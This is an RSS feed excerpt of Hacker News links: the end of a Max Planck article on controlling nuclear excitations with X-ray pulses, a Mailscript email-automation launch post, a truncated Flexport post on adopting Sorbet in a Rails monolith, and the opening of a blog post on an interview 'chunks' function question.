<p>A zeptosecond is one trillionth of a billionth of a second ‚Äì or a decimal point followed by 20 zeroes and a 1. In one zeptosecond, light does not even manage to pass through one per cent of a medium-sized atom. How can you imagine this in relation to our world? ‚ÄúIf you imagine that an atom were as big as the Earth, that would be about 50&nbsp;km, says J√∂rg Evers, who initiated the project.</p>
<h2>The sample is shifted by 45 trillionths of a metre</h2>

<figure data-description="Principle of coherent control using the example of tuning forks representing the two samples in the experiment. A bang (left, blue) excites both tuning forks to oscillate ‚Äì analogous to the synchrotron pulse. After the bang, the sound of the first fork additionally hits the second fork as the second part of the double pulse. Depending on the delay with which the sound from the first fork hits the second, the vibration of the second fork is either dampened (a) or amplified (b). The control of quantum dynamics in atomic nuclei works in an analogous way." data-picture="base64;PHBpY3R1cmUgY2xhc3M9IiIgZGF0YS1pZXNyYz0iLzE2NDQ5ODQ5L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRRd01Dd2liMkpxWDJsa0lqb3hOalEwT1RnME9YMCUzRC0tNzljODg1ZGFjNjE0NmRjM2EyYzY4Y2ExYzUzOTY3NjMxYjcwNWM3NCIgZGF0YS1hbHQ9Im9yaWdpbmFsIiBkYXRhLWNsYXNzPSIiPjxzb3VyY2UgbWVkaWE9IihtYXgtd2lkdGg6IDc2N3B4KSIgc3Jjc2V0PSIvMTY0NDk4NDkvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZOREUwTENKdlltcGZhV1FpT2pFMk5EUTVPRFE1ZlElM0QlM0QtLTgwNDZkN2Y0OTA0OGNhMWYyODllN2FkYWQ3NGQyZDRmNGNiODAwM2QgNDE0dywgLzE2NDQ5ODQ5L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TXpjMUxDSnZZbXBmYVdRaU9qRTJORFE1T0RRNWZRJTNEJTNELS1iM2EzMzUzNDk2N2FhZWU0NTEzZmVhNDljNmFlOTk2ZTI1OTE1Y2RhIDM3NXcsIC8xNjQ0OTg0OS9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk16SXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9EUTVmUSUzRCUzRC0tNzU4NmU4NGE0NzFjOWQ4MzUwNTk0MjhjMzdmOGRhMDgzNWJiZTk3MCAzMjB3LCAvMTY0NDk4NDkvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZOREV4TENKdlltcGZhV1FpT2pFMk5EUTVPRFE1ZlElM0QlM0QtLWI5MTkyYmJlNTkxZjk5MDgwNWIxMzkwZjg3NWIzMmNmNTdkZTBkYmEgNDExdywgLzE2NDQ5ODQ5L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TkRnd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RRNWZRJTNEJTNELS01ODgxYjAyNDY4MDRhYzhkNDA2NjFhYTQ5NDY2MWE2OTA5NDZkOTJiIDQ4MHcsIC8xNjQ0OTg0OS9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk16WXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9EUTVmUSUzRCUzRC0tNGFkYzkzZWUzMTU5ZjllNzlhNzg4NmJiZTY0YzIzODhjMGViM2ZlNSAzNjB3LCAvMTY0NDk4NDkvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZPREk0TENKdlltcGZhV1FpT2pFMk5EUTVPRFE1ZlElM0QlM0QtLTg2ZTRjNTUzN2FlZjYwOGU5Mjg0ZjlhMGY0ZTcxNWQxNjFlYjJhNzggODI4dywgLzE2NDQ5ODQ5L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TnpVd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RRNWZRJTNEJTNELS0zMzBkOTQxMmNlMzEwNDI5YmEwZTZlYWEyZTc2NzhiYWZmZGY2OWE5IDc1MHcsIC8xNjQ0OTg0OS9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk5qUXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9EUTVmUSUzRCUzRC0tYmVmZDlkYTUyNjRhMDg3ODQ2MTk4YTQ0NjY2OWZhNmU5ZDUxYmEzMCA2NDB3LCAvMTY0NDk4NDkvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZPREl5TENKdlltcGZhV1FpT2pFMk5EUTVPRFE1ZlElM0QlM0QtLWY4ZmE5MjBlMDZiMDVkZTkyMGFlMDI0M2MzZGMzM2MxNDQ5MTEzMDIgODIydywgLzE2NDQ5ODQ5L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2T1RZd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RRNWZRJTNEJTNELS0xZGQ3NWI3ODBjMWEzZDU2ZTc0YWRhZmYwZjg2MDRiZTg5NGNkNDAwIDk2MHcsIC8xNjQ0OTg0OS9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk56SXdMQ0p2WW1wZmFXUWlPakUyTkRRNU9EUTVmUSUzRCUzRC0tZTYwMTc4YzMzYTFlOTU2NTZkMTA1ODliOWMyZDAyMmI3YTUxOTM3YyA3MjB3IiBzaXplcz0iMTAwdnciIC8+PHNvdXJjZSBtZWRpYT0iKG1pbi13aWR0aDogNzY4cHgpIGFuZCAobWF4LXdpZHRoOiA5OTFweCkiIHNyY3NldD0iLzE2NDQ5ODQ5L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2T1RBd0xDSnZZbXBmYVdRaU9qRTJORFE1T0RRNWZRJTNEJTNELS04NDcxYWU5NTllMDdmMjk0ZDc3ZGUyNTllZWM2NDc4YTBkNWM1YTIxIDkwMHcsIC8xNjQ0OTg0OS9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk1UZ3dNQ3dpYjJKcVgybGtJam94TmpRME9UZzBPWDAlM0QtLTkwZmUyZGVlMDE3OTc2ZDdhNzcwMjU5NDcxNzU0YjgwZTc2YzdiMDIgMTgwMHciIHNpemVzPSI5MDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiA5OTJweCkgYW5kIChtYXgtd2lkdGg6IDExOTlweCkiIHNyY3NldD0iLzE2NDQ5ODQ5L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TVRJd01Dd2liMkpxWDJsa0lqb3hOalEwT1RnME9YMCUzRC0tZDMzZDliYmJkZmU1ZWJjYTZjYjgyOTRmMzA1M2M4MjViMzA1MWZhMSAxMjAwdywgLzE2NDQ5ODQ5L29yaWdpbmFsLTE2MTM3MTc3ODMuanBnP3Q9ZXlKM2FXUjBhQ0k2TWpRd01Dd2liMkpxWDJsa0lqb3hOalEwT1RnME9YMCUzRC0tYWZkZjk1OWFjNzkzMTkwYmQxYjM5NjQxMjNhYmNlMDdiZGUwMjEwOSAyNDAwdyIgc2l6ZXM9IjEyMDBweCIgLz48c291cmNlIG1lZGlhPSIobWluLXdpZHRoOiAxMjAwcHgpIiBzcmNzZXQ9Ii8xNjQ0OTg0OS9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk1UUXdNQ3dpYjJKcVgybGtJam94TmpRME9UZzBPWDAlM0QtLTc5Yzg4NWRhYzYxNDZkYzNhMmM2OGNhMWM1Mzk2NzYzMWI3MDVjNzQgMTQwMHcsIC8xNjQ0OTg0OS9vcmlnaW5hbC0xNjEzNzE3NzgzLmpwZz90PWV5SjNhV1IwYUNJNk1qZ3dNQ3dpYjJKcVgybGtJam94TmpRME9UZzBPWDAlM0QtLTBjOWMzM2FmYzVhNmNmODE5Y2FiZGJiZWU1ZTIwYTZiNDdmZjBlZGMgMjgwMHciIHNpemVzPSIxNDAwcHgiIC8+PGltZyBjbGFzcz0iIiB0aXRsZT0iUHJpbmNpcGxlIG9mIGNvaGVyZW50IGNvbnRyb2wgdXNpbmcgdGhlIGV4YW1wbGUgb2YgdHVuaW5nIGZvcmtzIHJlcHJlc2VudGluZyB0aGUgdHdvIHNhbXBsZXMgaW4gdGhlIGV4cGVyaW1lbnQuIEEgYmFuZyAobGVmdCwgYmx1ZSkgZXhjaXRlcyBib3RoIHR1bmluZyBmb3JrcyB0byBvc2NpbGxhdGUg4oCTIGFuYWxvZ291cyB0byB0aGUgc3luY2hyb3Ryb24gcHVsc2UuIEFmdGVyIHRoZSBiYW5nLCB0aGUgc291bmQgb2YgdGhlIGZpcnN0IGZvcmsgYWRkaXRpb25hbGx5IGhpdHMgdGhlIHNlY29uZCBmb3JrIGFzIHRoZSBzZWNvbmQgcGFydCBvZiB0aGUgZG91YmxlIHB1bHNlLiBEZXBlbmRpbmcgb24gdGhlIGRlbGF5IHdpdGggd2hpY2ggdGhlIHNvdW5kIGZyb20gdGhlIGZpcnN0IGZvcmsgaGl0cyB0aGUgc2Vjb25kLCB0aGUgdmlicmF0aW9uIG9mIHRoZSBzZWNvbmQgZm9yayBpcyBlaXRoZXIgZGFtcGVuZWQgKGEpIG9yIGFtcGxpZmllZCAoYikuIFRoZSBjb250cm9sIG9mIHF1YW50dW0gZHluYW1pY3MgaW4gYXRvbWljIG51Y2xlaSB3b3JrcyBpbiBhbiBhbmFsb2dvdXMgd2F5LiIgc3JjPSIvMTY0NDk4NDkvb3JpZ2luYWwtMTYxMzcxNzc4My5qcGc/dD1leUozYVdSMGFDSTZNVFF3TUN3aWIySnFYMmxrSWpveE5qUTBPVGcwT1gwJTNELS03OWM4ODVkYWM2MTQ2ZGMzYTJjNjhjYTFjNTM5Njc2MzFiNzA1Yzc0IiAvPjwvcGljdHVyZT4=">
      
      

    
    <figcaption>
        <p>
          Principle of coherent control using the example of tuning forks representing the two samples in the experiment. A bang (left, blue) excites both tuning forks to oscillate ‚Äì analogous to the synchrotron pulse. After the bang, the sound of the first fork additionally hits the second fork as the second part of the double pulse. Depending on the delay with which the sound from the first fork hits the second, the vibration of the second fork is either dampened (a) or amplified (b). The control of quantum dynamics in atomic nuclei works in an analogous way.
        </p>
        <p>
          ¬© MPI for Nuclear Physics
        </p>
    </figcaption>
</figure>


<p>The second X-ray pulse is delayed by a tiny displacement of the first sample, also containing iron nuclei with the appropriate quantum transition. ‚ÄúThe nuclei selectively store energy from the first X-ray pulse for a short period of time during which the sample is rapidly shifted by about half a wavelength of X-ray light‚Äù, explains Thomas Pfeifer, Director at the Max Planck Institute for Nuclear Physics in Heidelberg. This corresponds to about 45 trillionths of a metre. After this tiny movement, the sample emits the second pulse.</p>
<p>The physicists compare their experiment to two tuning forks that are at different distances from a firecracker (Figure 2). The bang first strikes the closer tuning fork, making it vibrate, and then moves on to the second tuning fork. In the meantime, the first tuning fork, now excited, emits sound waves itself, which arrive with a delay at the second fork. Depending on the delay time, this sound either amplifies or dampens the vibrations of the second fork ‚Äì just like the second push on the oscillating swing, as well as for the case of the excited nuclei.</p>
<p>With this experiment, J√∂rg Evers, Christoph Keitel, and Thomas Pfeifer and their team from the Max Planck Institute for Nuclear Physics in cooperation with researchers from DESY in Hamburg and the Helmholtz Institute/Friedrich Schiller University in Jena succeeded for the first time in demonstrating coherent control of nuclear excitations. In addition to synchrotron facilities such as those at the ESRF, free-electron lasers (FELs) such as the European XFEL at DESY have recently provided powerful sources of X-ray radiation ‚Äì even in laser-like quality. This opens up a dynamic future for the emerging field of nuclear quantum optics.</p>
<p><em>RW</em></p>
  
</div></div>]]>
            </description>
            <link>https://www.mpg.de/16449701/coherent-nuclear-excitations</link>
            <guid isPermaLink="false">hacker-news-small-sites-26190965</guid>
            <pubDate>Fri, 19 Feb 2021 08:48:33 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Mailscript, the Programmable Email Platform]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26190811">thread link</a>) | @leshokunin
<br/>
February 19, 2021 | https://blog.mailscript.com/mailscript-programmable-inbox/ | <a href="https://web.archive.org/web/*/https://blog.mailscript.com/mailscript-programmable-inbox/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
			<figure><img src="https://blog.mailscript.com/content/images/2020/11/Group-232.png" alt="" srcset="https://blog.mailscript.com/content/images/size/w600/2020/11/Group-232.png 600w, https://blog.mailscript.com/content/images/size/w1000/2020/11/Group-232.png 1000w, https://blog.mailscript.com/content/images/size/w1600/2020/11/Group-232.png 1600w, https://blog.mailscript.com/content/images/2020/11/Group-232.png 2000w" sizes="(min-width: 720px) 720px"></figure><p>One year ago, we realized there is no good service to sort and automate inbound emails. Back in the day, IFTTT let you do some of it, but that feature was killed. There are plenty of solutions to send transactional emails, newsletters, or large volumes. Yet, the average Gmail inbox gets 150 emails a day, and users are still expected to manually process their inbox for hours.</p><blockquote><strong>Email has become a notification center for everything.</strong></blockquote><p>90%+ of emails are transactional or newsletters. This means your inbox is no longer the place where discussions happen. Today's inbox resemble the notification center on your phone: each message contains a single bit of information, and a deep link to an action (such as approving a Pull Request, or opening a comment). Unlike on your phone, you can't easily snooze, dismiss, turn off, have granular control over emails.</p><p><a href="https://mailscript.com/">Mailscript </a>provides developer tools to makes it easy to program email automations. We will first offer <a href="https://docs.mailscript.com/">a CLI</a> and <a href="https://api.mailscript.com/">API </a>for developers (find out more in <a href="https://docs.mailscript.com/">our docs</a>).</p><h2 id="how-it-works">How it works</h2><ol><li>We give you a @mailscript.com address. Once you create yourname@, you can also create aliases, like shopping@yourname.mailscript.com. You can even use + or . like you would in Gmail. This means you can create an infinity of addresses, to use in your automations.</li></ol><figure><img src="https://blog.mailscript.com/content/images/2021/02/Creating-an-alias.png" alt=""><figcaption>How alias creation looks like in the CLI</figcaption></figure><p>2. Every time an email arrives at this address, Mailscript will analyze the email headers, participants, body, and attachments. We make everything neatly available in a JSON object. You'd be surprised how few alternatives there are for an API to deal with inbound emails!</p><p>(We're also creating parsers for prolific email senders. Currently, we understand GitHub emails (Issues, PRs, Actions), with plans to add GSuite, AWS and more soon)</p><p>3. Using <a href="https://docs.mailscript.com/">our CLI</a> and <a href="https://api.mailscript.com/">our API</a>, you can then start creating automations. Every automation in Mailscript consists of:</p><ul><li><strong>Triggers</strong>: Mailscript looks for everything in the email body and meta data. So you can set a trigger if a specific sender, multiple senders, an attachment or file type, specific words, email headers, time of day, or even if a certain amount of emails arrive within a time interval.</li><li><strong>Actions</strong>: you can output to a webhook, receive local notifications on your device, receive an SMS, send an email. We're working on adding integrations (ex: Google Drive).</li></ul><h2 id="examples-of-workflows">Examples of workflows</h2><p>Mailscript automations are called Workflows. Trigger + Action = Workflow.</p><p>Let's say you want to create a workflow called <strong>Post GitHub build failures to Discord</strong>:</p><ul><li>You could have any email that arrives at github@yourname.mailscript.com</li><li>Use the trigger "any GitHub build failure" (<a href="https://api.mailscript.com/">our API</a> makes it easy to parse GitHub emails)</li><li>The action "post a message to Discord"</li></ul><p>That's it! There are so many ways you can automate your email work with Mailscript:</p><p><strong>Groups:</strong></p><ul><li>Trigger: any email to engineering@yourname.mailscript.com</li><li>Alias to bob@gmail.com, joe@gmail.com</li></ul><p><strong>SMS notifications if new version</strong>:</p><ul><li>Trigger: email from this address, and body has "version"</li><li>Action: Send me an SMS</li></ul><p><strong>Run local commands (use Mailscript as a local daemon):</strong></p><ul><li>Trigger: if I send myself an email</li><li>Action: run this local command</li></ul><p>This means you can securely trigger code on a machine, without having to mess with SSH or making an API!</p><h2 id="get-in-touch-">Get in touch üôå</h2><p>We think there's a lot of exciting use cases for <a href="https://mailscript.com/">Mailscript</a>. <a href="https://mailscript.com/">Signups are open now</a> and we'd love to hear what you think. Please drop us an email at <a href="mailto:team@mailscript.com">contact@mailscript.com</a>, join <a href="https://discord.gg/US24HAVYq2">our Discord</a> or reach us <a href="https://twitter.com/getmailscript">on Twitter</a>!</p>
		</div></div>]]>
            </description>
            <link>https://blog.mailscript.com/mailscript-programmable-inbox/</link>
            <guid isPermaLink="false">hacker-news-small-sites-26190811</guid>
            <pubDate>Fri, 19 Feb 2021 08:21:05 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Adding Sorbet to a Rails Monolith]]>
            </title>
            <description>
<![CDATA[
Score 2 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26190586">thread link</a>) | @jasim
<br/>
February 18, 2021 | https://flexport.engineering/adding-sorbet-to-a-rails-monolith-ef72d6a18449 | <a href="https://web.archive.org/web/*/https://flexport.engineering/adding-sorbet-to-a-rails-monolith-ef72d6a18449">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><section><div><div><div><h2 id="4b5e">The Types Must Flow</h2><div><div><div><p><a href="https://medium.com/@william.pride?source=post_page-----ef72d6a18449--------------------------------" rel="noopener"><img alt="William Pride" src="https://miro.medium.com/fit/c/96/96/1*f62Aj7iEXUH8VAN_2QGbXQ.png" width="48" height="48"></a></p></div></div></div></div><p id="9afe">After writing Java for six years at my previous job, onboarding to Flexport‚Äôs large Rails monolith was a daunting task. Flexport‚Äôs domain ‚Äî international logistics ‚Äî is complex. Our operations span the globe and diverse business units from finance and customs to trucking and ocean freight. Even with a perfect codebase with zero incidental complexity the amount of inherent complexity would still be huge.</p><p id="4ebc">Ruby on Rails served us well getting up and running, but as our operations grew, the shortcomings of a ‚Äúconvention over configuration‚Äù monolith with a large team became more apparent. Models and code were becoming highly coupled across the team. The data model was very hard for new engineers to learn. Code changes in central parts of the application felt dangerous.</p><p id="ed86">We‚Äôve had a number of initiatives to manage this complexity. We created <a rel="noopener" href="https://flexport.engineering/interactively-visualizing-a-data-model-with-700-entities-ce5b88a49505">visualization</a> tools to better understand our data graph. We created <a rel="noopener" href="https://flexport.engineering/isolating-rails-engines-with-rubocop-210feaba3164">Rails Engines</a> to enforce domain modularity, reducing the surface area engineers had to worry about. We implemented a customized <a rel="noopener" href="https://flexport.engineering/approximating-prettier-for-ruby-with-rubocop-8b863bd64dc6">linter</a> that let us enforce formatting standards and ban unnecessarily confusing or non-idiomatic Ruby.</p><p id="396c">Unfortunately, even well-written and structured Ruby can be difficult for a new engineer to understand. Without type signatures, it‚Äôs hard to tell exactly what a method‚Äôs inputs and outputs are. You can‚Äôt reliably search for class and method definitions or usages since many aren‚Äôt <a href="https://stackoverflow.com/a/55306792" rel="noopener">explicitly defined</a> in source code or are called <a href="https://apidock.com/ruby/Object/public_send" rel="noopener">indirectly</a>. IDE features like Find Usages work poorly and so aren‚Äôt much help; command line tools can‚Äôt warn you about misspelled variables or calls to non-existent methods.</p><p id="6040">The underlying causes of these problems are the same: <a href="https://rollout.io/blog/metaprogramming-in-ruby/" rel="noopener">meta-programming</a> and <a href="https://medium.com/rubycademy/why-ruby-community-encourages-duck-typing-2e5fb529fca1" rel="noopener">dynamic typing</a>. Because Ruby lets you <a href="https://apidock.com/ruby/Module/define_method" rel="noopener">define a method</a> at runtime you can‚Äôt possibly know what methods are defined on a class just from searching the source code. There could be any method; there could even be <a href="http://rubylearning.com/satishtalim/ruby_method_missing.html" rel="noopener">all of them</a>! The same is true for constants and even <a href="https://johnragan.wordpress.com/2010/02/18/ruby-metaprogramming-dynamically-defining-classes-and-methods/" rel="noopener">classes</a>. These problems are particularly pronounced in Rails which makes heavy use of these meta-programming constructs.</p><p id="df61">For faster feedback loops during the development, we need <a href="https://en.wikipedia.org/wiki/Static_program_analysis" rel="noopener">static code analysis</a>. Static analysis lets IDEs and tools provide instantaneous error warnings and suggestions. This is much harder for untyped languages; however, some tools can add this functionality. Flexport had already added <a href="https://flow.org/" rel="noopener">Flow</a> to our JavaScript code with great results. Enter <a href="https://sorbet.org/" rel="noopener">Sorbet</a>, a gradual typing system for Ruby.</p><h2 id="5abb">Sorbet</h2><p id="6b1b">Sorbet brings to Ruby the static analysis that makes writing and refactoring code in typed languages so much safer and smoother. Sorbet warns when you try to reference a non-existent class, call a non-existent method, or pass in an argument of the wrong type. Sorbet will warn you about unused variables or unreachable code paths. Sorbet can even top Java in some regards; since Sorbet classes are non-nullable by default, Sorbet will warn you about potential null pointers. Best of all, Sorbet is blazingly <a href="https://blog.nelhage.com/post/why-sorbet-is-fast/#:~:text=Sorbet%20is%20fast.,typecheckers%20we%20are%20aware%20of." rel="noopener">fast</a>.</p><p id="032a">In order to be fast enough, static analysis must work without running your program code. Usually only a tightly optimized C executable will be performant enough.</p><p id="5246">This begs the question: if classes and methods are added by the Ruby runtime, but static code analysis can‚Äôt run Ruby code, how can a static tool possibly know all the types available in your Ruby codebase?</p><p id="3942">Sorbet cleverly solves this problem with a two-step process. First, Sorbet generates <code><a href="https://sorbet.org/docs/rbi" rel="noopener">RBI</a></code> (Ruby interface) files that enumerate the dynamic methods and classes used by your code. Sorbet does this by executing your Ruby code and performing <a href="https://en.wikipedia.org/wiki/Type_introspection" rel="noopener">runtime introspection</a> to see what methods and classes are added. Then, Sorbet can merge the types in your Ruby and RBI files and determine whether all the methods and classes referenced actually exist. Sorbet also provides a <a href="https://sorbet.org/docs/sigs" rel="noopener">signature DSL</a> for specifying the argument and return types of your methods. These annotations in your Ruby files work hand-in-hand with the generated RBI files to comprehensively analyze your codebase.</p><p id="0090">Because Ruby has so many constructs that are antithetical to static typing you have to do some work creating these RBI files in order for Sorbet to statically understand your codebase. In the rest of this post we‚Äôll go over how we added Sorbet to our monorepo at Flexport, the pitfalls we ran into, and the tools we made (and found) along the way. We‚Äôve open sourced any tools that we thought might be useful to the broader community.</p><h2 id="a0df">srb init</h2><p id="d9f2">The first step in adding Sorbet to a codebase is running <code><a href="https://sorbet.org/docs/adopting" rel="noopener">srb init</a></code> successfully. This command creates the set of <a href="https://sorbet.org/docs/rbi" rel="noopener">RBI files</a> that statically declare all of the modules, classes, constants, and methods that are added by Ruby at runtime. This is how Sorbet can be aware of methods defined by <code>define_method</code> or <code>method_missing</code> during static analysis ‚Äî without running any Ruby (slow) code.</p><p id="7bae">Sorbet learns about these dynamic methods and constants through <a href="https://en.wikipedia.org/wiki/Type_introspection" rel="noopener">runtime introspection</a>; that is, by requiring all of your classes and seeing what methods and constants get added. In a large codebase this can take a long time ‚Äî currently around 45 minutes for us at Flexport, though we understand we‚Äôre on the high end. Unsurprisingly, Rails applications seem to have a lot of dynamic methods that need to be enumerated here.</p><p id="b948">Ideally we‚Äôd only have run this once; unfortunately, we had to run this multiple times to work out all the issues. Sorbet has a way of unearthing many of the skeletons in a codebase‚Äôs closet. Because Sorbet needs to know about every line of your codebase, and because it can only learn by doing, the executable will likely run many files that haven‚Äôt been edited or even loaded in years. To get <code>srb init</code> to complete we had to:</p><ol><li id="d974">Remove an old 45MB migration file that was crashing the executable</li><li id="02ce">Remove a 10MB constants file</li><li id="b47e">Ignore many <code>.rb</code> scripts that looped indefinitely or raised an error when run locally. You can ignore files by adding <code><a href="https://sorbet.org/docs/static" rel="noopener"># typed: ignore</a></code> to the top or adding <code>‚Äî ignore</code> command to your <code><a href="https://sorbet.org/docs/cli#config-file" rel="noopener">config</a></code> file.</li><li id="0f0a">Fix, delete, or ignore many broken Ruby files that would crash when run due to things like missing constants or imports</li></ol><p id="58b8">The command notified us what file it was running when it crashed. This was usually enough information to work out the issue.</p><h2 id="b5af">Getting to false</h2><p id="697c">Once we managed to get <code>srb init</code> to complete we had a set of RBI files declaring all of the classes and modules we include from <code>gems</code>, as well as the methods and classes dynamically added by our own classes. This meant all of our types were known to Sorbet.</p><p id="6e21">The next step was getting the Sorbet typecheck to pass on our codebase at the minimum strictness level. Sorbet is a <a href="https://sorbet.org/docs/static" rel="noopener">gradual typing system</a>, meaning that you ‚Äúopt in‚Äù each file to a certain level of strictness and increase the strictness over time. Briefly, the levels are:</p><ul><li id="eca0"><code>ignore</code>: Sorbet cannot see this file.</li><li id="277b"><code>false</code>: All referenced classes and constants must be known</li><li id="0d02"><code>true</code>: All referenced methods must be known and called with the correct arity and type of arguments</li><li id="c256"><code>strict</code>: All methods must have <a href="https://sorbet.org/docs/sigs" rel="noopener">signatures</a></li><li id="1a33"><code>strong</code>: Sorbet knows the types of 100% of the variables in the file</li></ul><p id="323f">First we want Sorbet to pass with all files typed at <code>false</code>. At this level Sorbet checks that all of the constants and classes referenced in the codebase are valid, but does not check that methods exist. After running <code>srb init</code> all of the dynamic constants should be in RBI files; the rest should be in our normal Ruby files. So this type level should pass no-sweat, right?</p><p id="8a20">Unfortunately we had more work remaining. Sorbet cannot parse some Ruby constructs and so some of our formerly valid Ruby code was now considered invalid. Usually there was a one-to-one replacement for the disallowed syntax, but we had to fix all of these before Sorbet could pass at even the most lenient type level.</p><p id="e52d"><strong>No Dynamic Includes</strong></p><p id="0937">Ruby in all its permissiveness allows you to include an expression, as in <code>include Rails.application.routes.url_helpers</code> This makes static analysis impossible since Sorbet cannot know what the expression will evaluate to at runtime and so can‚Äôt know what constants will and will not be available in the class. All of these have to be replaced with constant includes:</p><figure><div role="button" tabindex="0"><div><div><p><img alt="Image for post" src="https://miro.medium.com/max/3200/0*TQGtHpNljg-M07K0" width="1600" height="353" srcset="https://miro.medium.com/max/552/0*TQGtHpNljg-M07K0 276w, https://miro.medium.com/max/1104/0*TQGtHpNljg-M07K0 552w, https://miro.medium.com/max/1280/0*TQGtHpNljg-M07K0 640w, https://miro.medium.com/max/1400/0*TQGtHpNljg-M07K0 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*TQGtHpNljg-M07K0?q=20"></p></div></div></div></figure><p id="0393">This was probably the trickiest to fix as we used <code>DryTypes</code> quite extensively and the core import statement is dynamic. Further, most of the classes being imported are themselves dynamically created! One of the joys (or horrors) of adding Sorbet to your codebase is learning about crazy cleverness going on under the hood. To address this particular problem we created a (now open sourced) <a href="https://github.com/Shopify/rubocop-sorbet/pull/20/files#diff-f458393d4e1cd28a518f14a646d97d55" rel="noopener">RuboCop rule</a> that can auto-correct dynamic DryTypes imports to a static formulation and forbids the dynamic form.</p><p id="b950">Sorbet provides its own <a href="https://sorbet.org/docs/tstruct" rel="noopener">Struct</a> system that replaces <code>DryTypes</code> and is statically analyzable by Sorbet. We‚Äôre in the process of migrating all of our <code>DryTypes</code> to <code>T::Structs</code>.</p><p id="6464"><strong>No Constant Inheritance</strong></p><p id="267e">The next largest set of changes we had to make was significantly easier; in Sorbet, child classes do not inherit constants from their parents. So, in places where a subclass accessed an inherited constant we either had to add the constant to the subclass, or add the full path to the superclass constant.</p><p id="82fe"><strong>Bad, Bad Code</strong></p><p id="e561">Sorbet will find references to classes and constants that just do not exist in methods that are never called or classes that are never included. Usually these classes had been moved or renamed and some reference was missed in the shuffle. While these errors are a bit embarrassing to find they are also the proof in the pudding: once you‚Äôve added Sorbet they become a thing of the past.</p><p id="ea8f"><strong>And the rest</strong></p><p id="a59d">Sorbet doesn‚Äôt allow some random Ruby constructs we were using lightly such as Regular Expression back references, a newer range syntax, and <code>private_class_method</code>. Sorbet is also stricter about using absolute paths than the Rails autoloader will require you to be, so some relative paths have to be updated.</p><p id="5684">We made each of these changes in separate pull requests before adding Sorbet to the codebase so that the changes ‚Ä¶</p></div></div></section></div></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://flexport.engineering/adding-sorbet-to-a-rails-monolith-ef72d6a18449">https://flexport.engineering/adding-sorbet-to-a-rails-monolith-ef72d6a18449</a></em></p>]]>
            </description>
            <link>https://flexport.engineering/adding-sorbet-to-a-rails-monolith-ef72d6a18449</link>
            <guid isPermaLink="false">hacker-news-small-sites-26190586</guid>
            <pubDate>Fri, 19 Feb 2021 07:28:51 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software Engineers struggle to write ‚Äúchunks‚Äù function]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=26190554">thread link</a>) | @javaguy1
<br/>
February 18, 2021 | https://shekhargulati.com/2021/02/18/why-do-software-engineers-struggle-to-write-chunks-function/ | <a href="https://web.archive.org/web/*/https://shekhargulati.com/2021/02/18/why-do-software-engineers-struggle-to-write-chunks-function/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><article id="post-6533">
	<!-- .entry-header -->

	
	
	<div>
		
<p>In the last couple of years, I took close to two hundred interviews. These interviews range from Java engineers with two years of experience to architects holding more than fifteen years of experience. The first round of our interview process, irrespective of the candidate experience, involves solving a small problem in a Google document.&nbsp;</p>



<p>I prefer Google docs because it removes the unnecessary fluff and most candidates are familiar with it. I understand that you may feel awkward and conscious when someone watches you while you are writing code. At the same time, it does give some understanding on how candidates keep calm under pressure, recover from their mistakes, and explain things.</p>



<p>I don‚Äôt expect people to write completely syntactically correct formatted code in Google docs. I give them 20 minutes of peaceful time to write the program. I once read that in other tech organizations, it is expected that you explain your approach and your thinking as you write code on a whiteboard (virtual or physical), but I prefer to give people an uninterrupted time so that they don‚Äôt have to do two things at a time. I try to make sure that they have understood the problem by giving them a couple of inputs and their expected output.&nbsp;</p>



<p>One question that I have used in most of our L1 interview rounds is shown below. Since 2021 I have stopped using this question so I thought it can be useful to share my analysis on how people performed in attempting this problem.</p>



<p><strong><em>You have to write a function that chunks an array into smaller arrays of specified size. For example, chunks([1,2,3,4,5] , 2) should return [[1,2],[3,4], [5]].</em></strong></p>



